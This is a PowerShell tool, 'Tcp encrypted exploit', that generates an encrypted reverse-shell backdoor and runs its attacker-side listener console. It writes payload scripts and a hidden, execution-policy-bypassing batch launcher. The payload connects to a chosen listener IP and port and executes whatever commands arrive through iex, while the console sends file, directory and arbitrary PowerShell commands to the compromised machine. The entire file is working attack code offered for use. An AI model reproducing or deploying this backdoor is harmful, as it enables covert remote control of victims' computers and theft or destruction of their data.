[console]::Title = "Tcp encrypted exploit"
cls
function gen
{
    $i = 1..16|ForEach-Object{Get-Random -max $($chars.Length)};
    $chars[$i] -join ""
}
function help
{
    Write-Host "+-----------------help-----------------+

    ================[shell]===================
    clear - clear the screen
    bye - safe way to exit
    ==========================================

    
    ==================[file]==================
    cat - read a content of a file
    ls - list a files and folders in the directory
    pushd - push path to choosen directory
    popd - redirect to a directory that have been pushed by pushd
    create - create a file
    ac - add a conent to a file
    clc - clear a content of file
    sc - set a content to file
    cd - navigate to directories
    md/mkdir - make a directory
    rd - remove a directory
    del - delate a file

    =========================================

    ================[network]================
    egress - send and recive egress traffic
    lis-browser - inject a dll and listen a browser traffic



    
    "
    $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(#h)")
    $write.Writeline($byte,0,$byte.length)
    $write.Flush()
}
$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
write-host "    
                _
               | \
     __________|__\   _______
    /              \ |       \
   (______.  .______\|        \
          |  |  _____)   |_)   )
          |  |  |    |   ____/
          | (   |    |  |
          |  |  |____|_ |
          \__|        / |
             \_______/  |
        EXPLOITATION |  |
                     |_/


" -ForegroundColor DarkCyan

write-host "
>>==========]" -NoNewline;Write-Host "     by natnael wubet      " -ForegroundColor Yellow -NoNewline
" [==========<<"
write-host ">>=========[]" -NoNewline;write-host " email: natyw4122@gmail.com" -NoNewline -ForegroundColor Yellow;write-host -NoNewline " []=========<<
>>=========[]";write-host "    phone: +251941226507    " -NoNewline -ForegroundColor Yellow;write-host -NoNewline "[]=========<<
>>=========[]";Write-Host -NoNewline "    facebook: naty.wubet    " -ForegroundColor Yellow;write-host "[]=========<<
       
       
  +---------------------[Tips!]-------------------+
  | This tool send and recive datas encryptedly.  |
  |                                               |
  | use $(gen) for the key: recommended |
  |_______________________________________________|

"




$lstn = read-host "listener ip"
$port = Read-Host "port"
$key = Read-Host "encryption key (recomended 16 digit)"
$payo = "function dec (`$bb) { if (`$bb.Length -gt 32) { `$mac = `$bb[-20..-1];`$bb = `$bb[0..(`$bb.length - 21)];`$hmac = New-Object System.Security.Cryptography.HMACSHA1;`$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key);`$exp = `$hmac.ComputeHash(`$bb);if (@(Compare-Object `$mac `$exp -Sync 0).Length -ne 0) { return; }; `$iv = `$bb[0..15]; `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider; `$enc.Mode = ""CBC""; `$enc.Key = [System.Text.Encoding]::utf8.GetBytes(`$key); `$enc.IV = `$iv; `$byteee = (`$enc.CreateDecryptor()).TransformFinalBlock((`$bb[16..`$bb.length]), 0, `$bb.length-16); [System.Text.Encoding]::UTF8.GetString(`$byteee); }; }; function enc (`$b) { `$b = [System.Text.Encoding]::UTF8.GetBytes(`$b); `$iv = [byte] 0..255 |Get-Random -Count 16; `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider; `$enc.Mode = ""CBC""; `$enc.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key); `$enc.IV = `$iv; `$txt = `$iv + (`$enc.CreateEncryptor()).TransformFinalBlock(`$b, 0, `$b.Length); `$mac = New-Object System.Security.Cryptography.HMACSHA1;`$mac.Key = [System.Text.Encoding]::utf8.GetBytes(`$key);`$txt + `$mac.ComputeHash(`$txt); }; `$key = ""$key""; `$cli = new-object system.net.sockets.tcpclient(""$lstn"",$port); `$str = `$cli.getstream();`$reader = New-Object System.IO.StreamReader `$str; `$write = New-Object System.IO.StreamWriter `$str; `$write.writeline(""have a shell if you have a key`n""); `$write.flush(); while (`$true) { [string]`$msg = `$reader.readline(); write-host ""`$msg""; try { `$res = iex `$msg; if (`$res -eq `$null) { write-host ""null""; `$enc = enc -b ""null result""; `$enc = `$enc -join (' '); `$write.writeline(""`$enc""); `$write.flush(); `$write.flush(); } else { `$ress = ""``n""; foreach (`$tmp in `$res) { `$ress += `$tmp + ""``n""; }; write-host ""`$ress""; `$enc = enc -b `$ress; `$enc = `$enc -join (' '); `$write.writeline(""`$enc""); `$write.flush(); `$write.flush(); }; } catch { write-host `$_; `$enc = enc -b ""error: `$_""; `$enc = `$enc -join (' '); `$write.writeline(""`$enc""); `$write.flush(); }; }; "
$pay = "
    function dec (`$bb)
    {
        
        if (`$bb.Length -gt 32)
        {
            `$mac = `$bb[-20..-1]
            `$bb = `$bb[0..(`$bb.length - 21)]
            `$hmac = New-Object System.Security.Cryptography.HMACSHA1
            `$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key)
            `$exp = `$hmac.ComputeHash(`$bb)
            if (@(Compare-Object `$mac `$exp -Sync 0).Length -ne 0)
            {
                return
            }
                
            `$iv = `$bb[0..15]
            `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            `$enc.Mode = ""CBC""
            `$enc.Key = [System.Text.Encoding]::utf8.GetBytes(`$key)
            `$enc.IV = `$iv
            `$byteee = (`$enc.CreateDecryptor()).TransformFinalBlock((`$bb[16..`$bb.length]), 0, `$bb.length-16)
            
            [System.Text.Encoding]::UTF8.GetString(`$byteee)
        }
    }
    function enc (`$b)
    {
        `$b = [System.Text.Encoding]::UTF8.GetBytes(`$b)
        `$iv = [byte] 0..255 |Get-Random -Count 16
        `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        `$enc.Mode = ""CBC"";
        `$enc.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key);
        `$enc.IV = `$iv;
        `$txt = `$iv + (`$enc.CreateEncryptor()).TransformFinalBlock(`$b, 0, `$b.Length);
        `$mac = New-Object System.Security.Cryptography.HMACSHA1;
        `$mac.Key = [System.Text.Encoding]::utf8.GetBytes(`$key);
        `$txt + `$mac.ComputeHash(`$txt);
    }

`$key = ""$key""
`$cli = new-object system.net.sockets.tcpclient(""$lstn"",$port)
`$str = `$cli.getstream()
`$reader = New-Object System.IO.StreamReader `$str
`$write = New-Object System.IO.StreamWriter `$str
`$write.writeline(""have a shell if you have a key`n"")
`$write.flush()
while (`$true)
{
    [string]`$msg = `$reader.readline()
    write-host ""`$msg""
    try {
        `$res = iex `$msg
        if (`$res -eq `$null)
        {
            write-host ""null""
            `$enc = enc -b ""null result""
            `$enc = `$enc -join (' ')
            `$write.writeline(""`$enc"")
            `$write.flush()
            `$write.flush()
        } else {
            `$ress = ""``n""
            foreach (`$tmp in `$res)
            {
                `$ress += `$tmp + ""``n"" 
            }
            write-host ""`$ress""
            `$enc = enc -b `$ress
            `$enc = `$enc -join (' ')
            `$write.writeline(""`$enc"")
            `$write.flush()
            `$write.flush()
        }
    } catch {
        write-host `$_
        `$enc = enc -b ""error: `$_""
        `$enc = `$enc -join (' ')
        `$write.writeline(""`$enc"")
        `$write.flush()
    }
}
"
sc .\back.ps1 $pay
sc .\back_oneline.ps1 $payo
sc .\back.bat "@powershell -executionpolicy bypass -nologo -noprofile -w hidden -file .\back.ps1" -Encoding Ascii
Write-Host "[+] backdoor payload writen to $((pwd).Path)\back.ps1 and back.bat`n" -ForegroundColor Cyan
Write-Host "[+] one line backdoor payload writen to $((pwd).Path)\back_oneline.ps1 `n" -ForegroundColor Cyan
Write-Host "[+] listening..." -ForegroundColor Gray -NoNewline
$tcp = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, $port)
$tcp.Start()
    function dec ($bb)
    {
        
        if ($bb.Length -gt 32)
        {
            $mac = $bb[-20..-1]
            $bb = $bb[0..($bb.length - 21)]
            $hmac = New-Object System.Security.Cryptography.HMACSHA1
            $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
            $exp = $hmac.ComputeHash($bb)
            if (@(Compare-Object $mac $exp -Sync 0).Length -ne 0)
            {
                return
            }
                
            $iv = $bb[0..15]
            $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $enc.Mode = "CBC"
            $enc.Key = [System.Text.Encoding]::utf8.GetBytes($key)
            $enc.IV = $iv
            $byteee = ($enc.CreateDecryptor()).TransformFinalBlock(($bb[16..$bb.length]), 0, $bb.length-16)
            
            [System.Text.Encoding]::UTF8.GetString($byteee)
        }
    }
    function enc ($b)
    {
        $b = [System.Text.Encoding]::UTF8.GetBytes($b)
        $iv = [byte] 0..255 |Get-Random -Count 16
        $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $enc.Mode = "CBC";
        $enc.Key = [System.Text.Encoding]::UTF8.GetBytes($key);
        $enc.IV = $iv;
        $txt = $iv + ($enc.CreateEncryptor()).TransformFinalBlock($b, 0, $b.Length);
        $mac = New-Object System.Security.Cryptography.HMACSHA1;
        $mac.Key = [System.Text.Encoding]::utf8.GetBytes($key);
        $txt + $mac.ComputeHash($txt);
    }

$cont = $tcp.AcceptTcpClient()
if ($cont.Connected)
{
    Write-Host "$($cont.Client.RemoteEndPoint) connected"
    $strm = $cont.GetStream()
    $reader = New-Object System.IO.StreamReader $strm
    $write = New-Object System.IO.StreamWriter $strm
    $res = $reader.ReadLine()
    Write-Host "$res`n" -ForegroundColor Yellow 
    while ($true)
    {
        $cmd = Read-Host "TCP $($r = $cont.Client.RemoteEndPoint -split (':');$r[0])"
        if ($cmd -ieq "clear")
        {
            cls
        } elseif ($cmd -ieq "help")
        {
            help
        } elseif ($cmd -ieq "cat")
        {
            $file = Read-Host "file name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(cat ""$file"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "pushd")
        {
            $dir = Read-Host "directory or path"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(pushd ""$dir"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "popd")
        {
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(popd)")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "cd")
        {
            $dir = Read-Host "directory or path"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(cd ""$dir"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "create")
        {
            $file = Read-Host "file name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(ni ""$file"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "ac")
        {
            $file = Read-Host "file name"
            $c = Read-Host "content"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(ac ""$file"" ""$c"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "sc")
        {
            $file = Read-Host "file name"
            $c = Read-Host "content"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(sc ""$file"" ""$c"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "clc")
        {
            $file = Read-Host "file name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(clc ""$file"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif (($cmd -ieq "md") -or ($cmd -ieq "mkdir"))
        {
            $dir = Read-Host "directory or path name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(mkdir ""$dir"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "rd")
        {
            $dir = Read-Host "directory or path name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(rd ""$dir"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "del")
        {
            $file = Read-Host "file name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(del ""$file"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "ac")
        {
            $dir = Read-Host "directory or path name"
            $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(rd ""$dir"")")
            $write.Writeline($byte,0,$byte.length)
            $write.Flush()
        } elseif ($cmd -ieq "bye")
        {
            $yes = Read-Host "are you sure, you want to quit?[y/n](y)"
            if (($yes -ieq "y") -or ([string]::IsNullOrEmpty($yes)))
            {
                Write-Host "[-] closing payload" -ForegroundColor Yellow
                $byte = [System.Text.Encoding]::UTF8.GetBytes("`$(exit)")
                $write.Writeline($byte,0,$byte.length)
                $write.Flush()
                Write-Host "[-] closing listener port" -ForegroundColor Yellow
                $tcp.Stop()
                exit
            }
            
        } elseif ($cmd -ieq "posh")
        {
            
            Write-Host "powershell`n"  -ForegroundColor Cyan
            while ($true)
            {
                $cmd = Read-Host "TCP POSH $($r = $cont.Client.RemoteEndPoint -split (':');$r[0])"
                if ($cmd -eq "exit")
                {
                    break;
                }
                $byte = [System.Text.Encoding]::UTF8.GetBytes("`$($cmd)")
                $write.Writeline($byte,0,$byte.length)
                $write.Flush()
                $res = $reader.Readline()
                $res = $res -split (' ')
                $res = dec -bb $res
                Write-Host "`n$res`n" -ForegroundColor White
            }
        } else {
            pushd commands
            if (!([string]::IsNullOrEmpty($cmd)))
            {
                if (test-path $cmd)
                {
                    $byte = [System.Text.Encoding]::UTF8.GetBytes("$(cat $cmd)")
                    $write.Writeline($byte,0,$byte.length)
                    $write.Flush()
                } else {
                    Write-Host "command not found" -ForegroundColor Red
                }
            }
            popd
        }
        $res = $reader.Readline()
        if ([string]::IsNullOrEmpty($res))
        {
            $res = $reader.Readline()
            if ([string]::IsNullOrEmpty($res))
            {
                $res = $reader.Readline()
                if ([string]::IsNullOrEmpty($res))
                {
                    $res = $reader.Readline()
                    if ([string]::IsNullOrEmpty($res))
                    {
                        $res = $reader.Readline()
                    }
                }
            }
        }
        $res = $res -split (' ')
        $res = dec -bb $res
        <#while (!([string]::IsNullOrEmpty($res)))
        {
            Write-Host "-" -NoNewline
            $res = $reader.Readline()
            $res = $res -split (' ')
            $res = dec -bb $res
        }#>
        Write-Host "`n$res`n" -ForegroundColor White
    }
}

